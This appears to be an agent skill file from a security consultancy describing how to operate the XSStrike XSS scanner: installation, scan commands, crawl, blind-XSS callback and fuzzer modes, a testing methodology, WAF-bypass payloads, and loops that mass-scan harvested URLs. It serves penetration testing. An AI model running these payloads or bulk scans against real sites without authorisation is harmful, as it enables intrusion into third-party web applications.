---
name: xsstrike
description: >
  Operate XSStrike — an advanced XSS detection and exploitation suite with intelligent payload
  generation, WAF fingerprinting, and DOM analysis. Use when testing web applications for
  reflected, stored, DOM-based, or blind XSS vulnerabilities. Covers installation, URL/POST
  scanning, crawler mode, blind XSS, fuzzer, custom headers, proxy integration, encoding,
  and a complete XSS testing methodology.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/s0md3v/XSStrike
  language: Python
---

# xsstrike Agent Skill

## When to Use This Skill

Use this skill when:
- Testing a web application parameter for XSS injection (GET, POST, JSON, multipart)
- Automated XSS discovery as part of a web application pentest
- Validating WAF bypass capability before manual XSS exploitation
- Discovering DOM-based XSS in JavaScript-heavy applications
- Blind XSS testing where payload fires asynchronously (admin panels, logs, email)
- Needing to understand XSStrike's fuzzer and payload generation vs manual approaches

## What XSStrike Does

XSStrike (s0md3v/XSStrike, ~13.5k GitHub stars) is a Python XSS scanner that goes beyond simple
payload injection: it parses HTML responses to understand the reflection context, generates
context-aware payloads, fingerprints WAFs, and can crawl an entire application to discover XSS
surfaces. Unlike tools that fire fixed payload lists, XSStrike analyses where input lands in the
DOM/HTML structure and crafts payloads accordingly. It also includes a fuzzer for discovering
novel filter bypasses and a blind XSS mode for out-of-band callback detection.

## Installation

### pip (Python 3.7+)
```bash
pip3 install xsstrike
xsstrike --help
```

### From Source (recommended for latest features)
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py --help
```

### Kali Linux
```bash
sudo apt update && sudo apt install -y xsstrike
```

### Dependencies
```
requests, urllib3, tld (pip3 install -r requirements.txt)
```

## Core Concepts

### Reflection Context Analysis
XSStrike parses the HTTP response to determine where the payload is reflected:
- **Inside HTML tag attribute**: `<input value="PAYLOAD">` → attribute escape
- **Inside script block**: `<script>var x = "PAYLOAD";</script>` → JS string escape
- **Inside HTML content**: `<p>PAYLOAD</p>` → tag injection
- **Inside HTML comment**: `<!-- PAYLOAD -->` → comment breakout

This context awareness means XSStrike generates payloads tailored to break out of the specific
context, rather than shotgun-spraying generic `<script>alert(1)</script>`.

### WAF Detection
XSStrike fingerprints WAFs by sending known probe strings and analysing:
- Response status codes (403, 406, 429)
- Response body signatures (Cloudflare, ModSecurity, Akamai keywords)
- Response headers (`X-Sucuri-ID`, `Server: cloudflare`)

Once a WAF is detected, XSStrike adapts encoding and obfuscation strategies.

### Fuzzer vs Scanner
- **Scanner** (`-u`): Analyses context and generates targeted payloads for confirmed parameters
- **Fuzzer** (`--fuzzer`): Tests a large set of payloads to discover which characters/patterns
  are filtered; useful for WAF bypass research

## CLI Reference

### Basic URL Scanning
```bash
# Scan all GET parameters in URL
python3 xsstrike.py -u "http://target.com/search?q=test"

# Scan specific parameter (skip others)
python3 xsstrike.py -u "http://target.com/page?id=1&q=test" --params "q"

# Skip parameters (test all except listed)
python3 xsstrike.py -u "http://target.com/search?q=test&page=1" --skip "page"
```

### POST Data
```bash
# URL-encoded POST body
python3 xsstrike.py -u "http://target.com/login" --data "user=admin&pass=test"

# JSON POST body
python3 xsstrike.py -u "http://target.com/api/search" \
  --data '{"query":"test","limit":10}' \
  --headers "Content-Type: application/json"

# Multipart form (specify parameter to test)
python3 xsstrike.py -u "http://target.com/upload" \
  --data "name=test&comment=XSS" \
  --params "comment"
```

### Crawl Mode
```bash
# Crawl the entire site and test all forms/parameters
python3 xsstrike.py -u "http://target.com" --crawl

# Crawl with depth limit
python3 xsstrike.py -u "http://target.com" --crawl --crawl-depth 3

# Crawl with thread control
python3 xsstrike.py -u "http://target.com" --crawl --threads 10

# Crawl with timeout per page
python3 xsstrike.py -u "http://target.com" --crawl --timeout 15
```

### Blind XSS
```bash
# Enable blind XSS with callback URL (your canary server)
python3 xsstrike.py -u "http://target.com/feedback?msg=test" \
  --blind http://your-server.com/xss-callback

# Blind XSS with POST
python3 xsstrike.py -u "http://target.com/contact" \
  --data "message=test&email=test@test.com" \
  --blind https://your-canary.burpcollaborator.net

# Self-hosted callback: run nc listener or use interactsh
# interactsh-client -v  → generates unique URL
# Pass that URL as --blind value
```

### DOM-Based XSS
```bash
# Enable DOM analysis (parses JavaScript for sink/source patterns)
python3 xsstrike.py -u "http://target.com/app?input=test" --dom

# DOM mode is slower — use with -t 1 for single-threaded to avoid race conditions
python3 xsstrike.py -u "http://target.com/app?input=test" --dom --timeout 20
```

### Fuzzer Mode
```bash
# Fuzz a parameter to discover what characters are filtered
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer

# Fuzzer with POST
python3 xsstrike.py -u "http://target.com/search" \
  --data "q=test" --fuzzer

# Fuzzer output helps craft manual bypasses:
# Green = allowed, Red = blocked
```

### Custom Headers
```bash
# Add auth token
python3 xsstrike.py -u "http://target.com/api?q=test" \
  --headers "Authorization: Bearer eyJhbGc..."

# Multiple headers (newline-separated within quotes)
python3 xsstrike.py -u "http://target.com/search?q=test" \
  --headers "Cookie: session=abc123
X-Custom-Header: value
Referer: http://target.com"

# User-agent spoofing
python3 xsstrike.py -u "http://target.com/search?q=test" \
  --headers "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

### Proxy Support
```bash
# Route through Burp Suite (capture payloads for analysis)
python3 xsstrike.py -u "http://target.com/search?q=test" \
  --proxy http://127.0.0.1:8080

# SOCKS5 proxy
python3 xsstrike.py -u "http://target.com/search?q=test" \
  --proxy socks5://127.0.0.1:1080
```

### Encoding and Timeout
```bash
# Encode payloads (useful when raw payloads are being decoded server-side)
python3 xsstrike.py -u "http://target.com/search?q=test" --encode

# Custom timeout (default 7s)
python3 xsstrike.py -u "http://target.com/search?q=test" --timeout 15

# Delay between requests (rate limit evasion, in seconds)
python3 xsstrike.py -u "http://target.com/search?q=test" --delay 2
```

### Threading
```bash
# Increase thread count for crawler
python3 xsstrike.py -u "http://target.com" --crawl --threads 20

# Single-threaded (more stable for JS-heavy apps)
python3 xsstrike.py -u "http://target.com" --crawl --threads 1
```

### Output and Logging
```bash
# Log all payloads that trigger a hit
python3 xsstrike.py -u "http://target.com/search?q=test" --log hits.log

# Verbose output (show all payload attempts)
python3 xsstrike.py -u "http://target.com/search?q=test" -v

# Skip confirmation (non-interactive mode for scripting)
python3 xsstrike.py -u "http://target.com/search?q=test" --skip-dom
```

## XSS Testing Methodology

### Phase 1: Reflected XSS
1. Identify all GET/POST parameters that reflect input back in the response
2. Determine reflection context (attribute, script, HTML, comment)
3. Test basic injection: `"><script>alert(1)</script>`
4. If filtered, use XSStrike's context-aware payloads
5. Validate: does the payload execute in browser? Does CSP block it?

```bash
# Enumerate parameters first with Arjun
arjun -u http://target.com/search

# Then test each discovered parameter
python3 xsstrike.py -u "http://target.com/search?q=test&category=test" \
  --params "q"
```

### Phase 2: Stored XSS
1. Identify input fields that store data (comments, profiles, messages)
2. Submit XSStrike payload in each field
3. Navigate to the page that renders stored content
4. Check for payload execution

```bash
# Test stored XSS via POST (submit form)
python3 xsstrike.py -u "http://target.com/post/comment" \
  --data "post_id=5&comment=test&author=tester"

# After submission, verify at the rendering endpoint manually
# or use --crawl to have XSStrike follow stored content
```

### Phase 3: DOM-Based XSS
1. Review page JavaScript for dangerous sinks:
   - `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `location.hash`
2. Identify sources: `location.search`, `location.hash`, `document.referrer`, `postMessage`
3. Test with XSStrike DOM mode

```bash
python3 xsstrike.py -u "http://target.com/app#test" --dom
# Also test manually: http://target.com/app#<img src=x onerror=alert(1)>
```

### Phase 4: Blind XSS
1. Target fields that may be viewed by admins/support (feedback forms, error reports, logs)
2. Use Burp Collaborator, interactsh, or canary tokens as callback
3. Submit payloads and monitor for callbacks

```bash
# Setup interactsh first
interactsh-client -v &
# Copy generated URL (e.g., abcd1234.oast.fun)

python3 xsstrike.py -u "http://target.com/feedback" \
  --data "name=attacker&message=test" \
  --blind "http://abcd1234.oast.fun"
```

## WAF Bypass Strategies

When XSStrike detects a WAF, manually supplement with these techniques:
```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>

// Tag splitting
<scr<script>ipt>alert(1)</scr</script>ipt>

// HTML entity encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

// JavaScript protocol in href
<a href="javascript&#58;alert(1)">click</a>

// SVG vector
<svg/onload=alert(1)>

// Template literals (inside JS context)
`${alert(1)}`

// Event handler alternatives
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
```

## Advanced Techniques

### Custom Payload Integration
```bash
# Add custom payloads to XSStrike payload database
# Edit: XSStrike/db/payloads.txt
echo '<svg/onload=confirm(1)>' >> XSStrike/db/payloads.txt
echo '"><img src=x onerror=prompt(1)>' >> XSStrike/db/payloads.txt
```

### Scripted Scan Over URL List
```bash
#!/bin/bash
# Test all URLs from a list (e.g., from gau/waybackurls)
while IFS= read -r url; do
  echo "[*] Testing: $url"
  python3 /opt/XSStrike/xsstrike.py -u "$url" --timeout 10 2>/dev/null | \
    grep -i "xss\|vulnerable\|payload" | tee -a xss_findings.txt
done < parameterized_urls.txt
```

### Integration with Passive URL Discovery
```bash
# Discover URLs with parameters via gau (GetAllUrls)
gau target.com | grep "=" | sort -u > parameterized.txt

# Filter to likely XSS sinks
grep -iE "search|query|q=|s=|name=|input=|text=|msg=" parameterized.txt > xss_candidates.txt

# Run XSStrike against candidates
while read url; do
  python3 xsstrike.py -u "$url" --skip-dom --timeout 8 &
done < xss_candidates.txt
wait
```

## Integration with Other Tools

| Stage | Tool | Purpose |
|-------|------|---------|
| Parameter discovery | Arjun | Find hidden parameters before XSStrike |
| URL harvesting | gau / waybackurls | Feed historical parameterized URLs |
| Traffic capture | Burp Suite | `--proxy` to inspect all payloads |
| Blind callbacks | interactsh / Burp Collaborator | Catch async blind XSS fires |
| CSP analysis | CSP Evaluator | Determine exploitability after find |
| DOM analysis | Chrome DevTools | Manually trace source → sink |

## Troubleshooting

**No payloads tested / exits immediately**
```bash
# XSStrike couldn't find parameters — specify explicitly
python3 xsstrike.py -u "http://target.com/search?q=test" --params "q"
```

**All payloads blocked (WAF)**
```bash
# Use fuzzer to discover allowed characters
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer
# Then craft manual payloads based on what passes
```

**SSL certificate errors**
```bash
# Disable SSL verification (self-signed certs in internal apps)
# Edit xsstrike.py: add verify=False to requests calls
# Or use: --proxy http://127.0.0.1:8080 (Burp handles SSL)
```

**Crawler misses forms behind login**
```bash
# Pre-authenticate and pass session cookie
python3 xsstrike.py -u "http://target.com/dashboard" \
  --headers "Cookie: session=authenticated_session_id" \
  --crawl
```

**DOM mode false positives**
- Verify manually in browser: open DevTools → Console → paste payload
- Check if `alert()` is overridden by the application framework
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
